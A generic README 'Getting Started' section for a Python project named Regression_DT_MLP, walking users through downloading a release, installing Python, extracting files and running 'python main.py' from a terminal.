## 🚀 Getting Started
To get started with Regression_DT_MLP, follow the steps below. By the end, you will have downloaded and run our Python applications smoothly.

### 📥 Step 1: Visit the Download Page
Go to our [Releases page](https://github.com/ProfessorMilanz/Regression_DT_MLP/releases) to find the latest version of the application. This page contains all available versions along with detailed descriptions of each.

### 🚧 Step 2: Choose the Release
On the Releases page, you will see a list of published versions. Look for the most recent release at the top of the page. Each release may contain different features or fixes, so read the notes to understand what’s included. 

### 📦 Step 3: Download the Software
Find the download link for your operating system. Click on the appropriate file name to download it directly to your computer. 

### 🎯 Step 4: Install Python (If Necessary)
Before you can run the software, ensure that you have Python installed on your computer. If Python is not installed, you can download it from the official Python website here: [Download Python](https://www.python.org/downloads/). Follow the instructions provided on the website for installation.

### 📃 Step 5: Extract Files (If Necessary)
If you downloaded a zipped folder, you must extract its contents. Right-click on the downloaded file and choose the option to extract the folder. This will create a new folder with the same name as the downloaded file.

### 🔍 Step 6: Open a Terminal or Command Prompt
To run the program, you need to open a terminal (on macOS or Linux) or a command prompt (on Windows). 

1. **Windows**: Press `Win + R`, type `cmd`, and press Enter.
2. **macOS**: Press `Cmd + Space`, type `Terminal`, and press Enter.
3. **Linux**: Open your preferred terminal application.

### 🚀 Step 7: Navigate to the Application Folder
Use the `cd` command followed by the path to the folder where you extracted the files. For example:
```
cd path/to/your/extracted/folder
```
Replace `path/to/your/extracted/folder` with the actual path on your computer.

### 🔑 Step 8: Run the Application
You can start the application using the Python command, followed by the main file name. For example:
```
python main.py
```
Make sure to replace `main.py` with the actual name of the main file you want to run.

### 🎉 Step 9: Explore the Code
Once the application is up and running, take some time to explore the code and understand how everything works. The project includes comments and documentation that explain each part of the code.
